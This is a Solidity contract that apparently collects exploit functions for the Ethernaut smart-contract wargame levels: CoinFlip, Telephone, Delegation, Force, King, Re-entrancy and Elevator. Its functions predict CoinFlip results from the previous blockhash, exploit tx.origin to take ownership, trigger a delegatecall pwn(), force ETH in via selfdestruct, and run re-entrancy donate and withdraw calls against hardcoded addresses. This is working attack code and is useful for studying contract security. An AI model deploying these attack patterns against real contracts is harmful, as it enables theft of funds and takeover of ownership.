pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
// import "@openzeppelin/contracts/access/Ownable.sol"; 
// https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol
import '@openzeppelin/contracts/utils/math/SafeMath.sol';
import {CoinFlip} from "./interfaces/CoinFlip.sol";
import {Telephone} from "./interfaces/Telephone.sol";
import {Delegation} from "./interfaces/Delegation.sol";
import {Force} from "./interfaces/Force.sol";

contract Building {
  using SafeMath for uint256;
  event SetPurpose(address sender, string purpose);

  address public owner;
  address delegate = 0xE7dc12C53437A2CB28c8f82386A40FB29c43A09c;
  string public purpose = "Building Unstoppable Apps!!!";
  address private sC = 0x70a70541E07D9244E09A04FCe95870E4D181FEfD;
  address private telAddress = 0x68B4F8A735376d3F11fa5Be09f1eF9043A2A0495;
  address private del = 0xA684dBA7D78d79A60D8FeBC44f8891F9e1cA85C3;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  bool private top = true;

  constructor() {
    // what should we do on deploy?
    owner = msg.sender;
  }


  function win() public {
      CoinFlip cf = CoinFlip(sC);
      uint256 blockValue = uint256(blockhash(block.number.sub(1)));

      uint256 coinFlip = blockValue.div(FACTOR);
      bool side = coinFlip == 1 ? true : false;

      cf.flip(side);
      console.log(msg.sender,"set flip to",side);
      emit SetPurpose(msg.sender, purpose);
  }

  function setPurpose(string memory newPurpose) public {
      purpose = newPurpose;
      console.log(msg.sender,"set purpose to",purpose);
      emit SetPurpose(msg.sender, purpose);
  }


  function changeOwner() public {
      Telephone tel = Telephone(telAddress);

      tel.changeOwner(tx.origin);
      console.log(tx.origin,"set owner to");
  }
  function callDel() public returns (bool) {
    Delegation a = Delegation(del);
    (bool success,) = address(a).call(abi.encodeWithSignature("pwn()"));
    return success;
  }

  function force() public payable {
    address forceAddr = 0xfe9C7625Ad70EbCC2a1a8983198d0D18F710755E;
    address payable addr = payable(forceAddr);
    selfdestruct(addr);
  
  }

  function badKing() public payable {
    address king = 0x832Bfd4f3D77c21E44E201c7329402686018771a;
    address payable kingP = payable(king);
    (bool result, ) = kingP.call{value: msg.value}("");
    require(result);
  }
  function reEntrancyDonate() public payable {
    address reE = 0x8f16bEe14F60225D51C9c677aa5Bb471CC430bE1;
    address payable reEp = payable(reE);
    (bool result, ) = reEp.call{value: msg.value}(abi.encodeWithSignature("donate(address)", address(this)));
    require(result);
  }
  function reEntrancyWithdraw() public {
    address reE = 0x8f16bEe14F60225D51C9c677aa5Bb471CC430bE1;
    address payable reEp = payable(reE);
    (bool result, ) = reEp.call(abi.encodeWithSignature("withdraw(uint256)", 0.001 ether));
    require(result);
  }

  function elevator() public {
      address addr = 0xB3FbE58080DFC17274D55eAEa381A7ca2c7661F7;
      address payable addrP = payable(addr);
      (bool result, ) = addrP.call(abi.encodeWithSignature("goTo(uint256)", 20));
      require(result);
  }

  function isLastFloor(uint _floor) public returns (bool){
    if(_floor == 20){
      top = !top;
      return top;
    }
    else return false;
  }


  // to support receiving ETH by default
  receive() external payable {
    //revert("youcan't"); for king
    //eEntrancyWithdraw();

  }
  fallback() external payable {
  
  }
}
